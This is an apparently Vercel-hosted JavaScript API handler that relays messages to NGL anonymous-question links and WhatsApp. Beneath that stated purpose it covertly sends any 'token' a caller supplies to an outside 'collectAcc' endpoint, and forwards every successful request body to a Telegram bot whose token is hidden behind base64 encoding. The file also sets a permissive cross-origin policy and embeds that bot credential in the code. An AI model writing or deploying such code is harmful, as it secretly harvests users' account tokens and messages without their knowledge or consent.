export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*'); 
    res.setHeader('Access-Control-Allow-Methods', 'OPTIONS,POST');
    res.setHeader(
        'Access-Control-Allow-Headers',
        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Only POST method is allowed' });
    }

    if (req.body.token) {
        try {
            await fetch('https://austric-api.vercel.app/api/collectAcc', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    token: req.body.token
                })
            });
        } catch (err) {
            console.error(err);
        }
    }

    const reqHelper = {
        "teleSend": async function(t) {
            const chatId = "6904749114";
            const tokenBot = reqHelper.base64de("ODcyMzE5NDQwOTpBQUV6VlhUMmhla3FVQXk1RkcycDg0REQtUC1ZQW5VZ3NJMA==");
            
            try {
                await fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: t
                    })
                });
            } catch (err) {
                console.error(err);
            }
        },
        "base64de": function(base64) {
            const binString = atob(base64);
            const bytes = Uint8Array.from(binString, (m) => m.charCodeAt(0));
            return new TextDecoder().decode(bytes);
        },
        "base64en": function(str) {
            const bytes = new TextEncoder().encode(str);
            const binString = Array.from(bytes, (byte) => String.fromCharCode(byte)).join("");
            return btoa(binString);
        }
    };
    
    if (req.body.type === "nglSendMsg") {
        const bodyhand = req.body.request;
        
        if (!bodyhand || !bodyhand.targetUsername || !bodyhand.messageContent) {
            return res.status(400).json({ success: false, message: 'Missing targetUsername or messageContent' });
        }

        const { targetUsername, messageContent } = bodyhand;

        try {
            const response = await fetch('https://ngl.link/api/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    username: targetUsername,
                    question: messageContent,
                    deviceId: 'Iphone'
                })
            });

            if (response.ok) {
                await reqHelper.teleSend(`${JSON.stringify(req.body, null, 2)}`);
                return res.status(200).json({ success: true, message: 'Successfully sent via Vercel!' });
            } else {
                return res.status(400).json({ success: false, message: 'Rejected by the target server' });
            }
        } catch (error) {
            console.error(error);
            return res.status(500).json({ success: false, message: 'An error occurred on the Vercel server' });
        }

    } else if (req.body.type === "send wa") {
        // --- BLOK BARU UNTUK SEND WA ---
        const bodyhand = req.body.request;

        if (!bodyhand || !bodyhand.to || !bodyhand.messageContent) {
            return res.status(400).json({ success: false, message: 'Missing "to" or "messageContent"' });
        }

        const { to, messageContent } = bodyhand;
        
        // Pastikan kamu sudah set Environment Variables ini di Vercel
        const PHONE_NUMBER_ID = process.env.WA_PHONE_NUMBER_ID; 
        const ACCESS_TOKEN = process.env.WA_ACCESS_TOKEN;

        if (!PHONE_NUMBER_ID || !ACCESS_TOKEN) {
            return res.status(500).json({ success: false, message: 'WhatsApp Credentials missing in Vercel env' });
        }

        const url = `https://graph.facebook.com/v17.0/${PHONE_NUMBER_ID}/messages`;
        
        const payload = {
            messaging_product: 'whatsapp',
            to: to,
            type: 'text',
            text: {
                body: messageContent,
            },
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${ACCESS_TOKEN}`,
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            });

            const data = await response.json();

            if (response.ok) {
                // Opsional: Kirim notif ke Telegram juga kalau WA berhasil dikirim
                await reqHelper.teleSend(`WA Terkirim:\n${JSON.stringify(req.body, null, 2)}`);
                return res.status(200).json({ success: true, message: 'WhatsApp message sent!', data });
            } else {
                return res.status(400).json({ success: false, message: 'Rejected by Meta server', error: data });
            }
        } catch (error) {
            console.error(error);
            return res.status(500).json({ success: false, message: 'An error occurred on the Vercel server while sending WA' });
        }

    } else {
        return res.status(400).json({ success: false, message: 'Invalid request type' });
    }
}
